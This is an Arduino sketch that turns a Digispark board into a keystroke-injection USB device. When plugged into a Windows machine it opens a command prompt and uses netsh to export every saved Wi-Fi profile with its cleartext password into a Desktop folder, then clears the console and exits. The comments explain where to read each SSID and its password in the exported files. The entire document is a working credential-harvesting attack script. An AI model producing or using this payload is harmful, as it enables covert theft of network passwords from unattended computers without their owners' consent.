#include "DigiKeyboard.h"

void setup() {
  pinMode(1,OUTPUT);
}

void loop() {

  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000); /*Pauses for 3 seconds to ensure Windows has fully recognized the USB device before commands start*/
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); /*Simulates pressing the Windows Key + R to open the "Run" dialog box*/
  DigiKeyboard.delay(500);
  DigiKeyboard.println("cmd /k mode"); /*Types cmd /k mode into the Run box and presses Enter. This opens a Command Prompt window and uses the /k switch (keep open) so subsequent commands are typed into this persistent black window rather than opening a new Run dialog box*/
  DigiKeyboard.delay(500);
  DigiKeyboard.println("mkdir \"C:\\Users\\%USERNAME%\\Desktop\\WiFi_Passwords"); /*Creates the Wifi_Passwords folder where specified*/
  DigiKeyboard.delay(1500);
  DigiKeyboard.println("netsh wlan export profile folder=C:\\Users\\%USERNAME%\\Desktop\\WiFi_Passwords key=clear");/*saved .xml files of each network profile in C:\Users\%USERNAME%\Desktop\WiFi_Passwords so you can click on each profile and look for the <name> for the SSID and <keymaterial> for the cleartext password that is saved for each wifi password*/
  DigiKeyboard.delay(4000);
  DigiKeyboard.println("cls"); /*Clears all commands in CMD*/
  DigiKeyboard.delay(4000);
  DigiKeyboard.println("exit");/*exits out of CMD*/

  DigiKeyboard.delay(200);
  digitalWrite(1,HIGH); /*Turns on the LED*/
  DigiKeyboard.delay(50);
  digitalWrite(1,LOW); /*Turns off the LED*/
  DigiKeyboard.delay(300000);
}
